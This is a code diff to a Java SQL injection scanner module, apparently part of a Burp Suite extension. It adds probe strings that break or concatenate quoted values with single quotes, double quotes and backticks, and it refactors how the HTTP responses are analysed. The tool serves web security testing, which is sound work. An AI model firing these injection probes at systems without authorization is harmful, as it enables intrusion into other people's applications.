@@ -40,14 +40,14 @@ public class AttackSqlExtended extends AttackI {
     
     private static String atkName = "SQLE";
     
-    private final int attackSqlIntSize = 3;
+    private final int attackSqlIntSize = 5;
     private String attackSqlInt(int state, String value) {
         String ret = "";
         
         switch (state) {
             // break test
             case 0:
-                ret = value + "BREAK1'2\"3`";
+                ret = value + "BREAK1'2\"3`4";
                 break;
                 
             // pure int based (no quotes)
@@ -63,20 +63,26 @@ public class AttackSqlExtended extends AttackI {
             case 2: // 
                 ret = value + "' + 0 + '0";
                 break;
+            case 3: // 
+                ret = value + "\" + 0 + \"0";
+                break;
+            case 4: // 
+                ret = value + "` + 0 + `0";
+                break;
         }
         
         return ret;
     }
 
-    private final int attackSqlStrSize = 5;
+    private final int attackSqlStrSize = 11;
     private String attackSqlStr(int state, String value) {
         String ret = "";
         
         // origstr: aaa
         // SELECT ... WHERE name = 'aaa'
         switch(state) {
-            case 0: // a'BREAK"aa
-                ret = value.substring(0, 1) + "'BREAK\"" + value.substring(1, value.length());
+            case 0: // BREAK1'2\"3`4
+                ret = value.substring(0, 1) + "BREAK1'2\"3`4" + value.substring(1, value.length());
                 break;
             case 1: // a'||'aa
                 ret = value.substring(0, 1) + "' || '" + value.substring(1, value.length());
@@ -87,7 +93,25 @@ public class AttackSqlExtended extends AttackI {
             case 3: // a' 'aa
                 ret = value.substring(0, 1) + "' '" + value.substring(1, value.length());
                 break;
-            case 4: // /**/aaa
+            case 4: // a" || "aa
+                ret = value.substring(0, 1) + "\" || \"" + value.substring(1, value.length());
+                break;
+            case 5: // a" + "aa
+                ret = value.substring(0, 1) + "\" + \"" + value.substring(1, value.length());
+                break;
+            case 6: // a" "aa
+                ret = value.substring(0, 1) + "\" \"" + value.substring(1, value.length());
+                break;
+            case 7: // a` || `aa
+                ret = value.substring(0, 1) + "` || `" + value.substring(1, value.length());
+                break;
+            case 8: // a` + `aa
+                ret = value.substring(0, 1) + "` + `" + value.substring(1, value.length());
+                break;
+            case 9: // a` `aa
+                ret = value.substring(0, 1) + "` `" + value.substring(1, value.length());
+                break;
+            case 10: // /**/aaa
                 ret = "/**/" + value;
                 break;
         }
@@ -196,6 +220,8 @@ public class AttackSqlExtended extends AttackI {
     public boolean performNextAttack() {        
         String origParamValue = attackWorkEntry.attackHttpParam.getDecodedValue();
         String data;
+        SentinelHttpMessageAtk httpMessage = null;
+
         
         // Cant handle empty params
         if (origParamValue.length() == 0) {
@@ -216,19 +242,20 @@ public class AttackSqlExtended extends AttackI {
         }
         
         try {
-            SentinelHttpMessage httpMessage = attack(data);
+            httpMessage = attack(data);
             if (httpMessage == null) {
                 BurpCallbacks.getInstance().getBurp().printOutput("HTTPMESSAGE NULL");
                 return false;
             }
             analRes.add(httpMessage.getResponse());
+            
+            analyzeResponse(httpMessage);
         } catch (ConnectionTimeoutException ex) {
             BurpCallbacks.getInstance().print("Connection timeout");
             state++;
             return false;
         }
         
-        analyzeResponse();
         state++;
         
         // End
@@ -243,19 +270,19 @@ public class AttackSqlExtended extends AttackI {
     }
     
     
-    private void analyzeResponse() {
+    private void analyzeResponse(SentinelHttpMessageAtk httpMessage) {
         if (state == -1) {
-            analyzeOriginalRequest(lastHttpMessage);
+            analyzeOriginalRequest(httpMessage);
             doContinue = true;
         } else if (state == 0) {
-            doContinue = analyzer.analyzeBreak(attackWorkEntry, lastHttpMessage);
+            doContinue = analyzer.analyzeBreak(attackWorkEntry, httpMessage);
         } else {
-            analyzer.analyzeAttackResponse(attackWorkEntry, lastHttpMessage);
+            analyzer.analyzeAttackResponse(attackWorkEntry, httpMessage);
         }
     }
 
     
-    private SentinelHttpMessage attack(String data) throws ConnectionTimeoutException {
+    private SentinelHttpMessageAtk attack(String data) throws ConnectionTimeoutException {
         SentinelHttpMessageAtk httpMessage = initAttackHttpMessage(data, atkName, state);
         if (httpMessage == null) {
             return null;
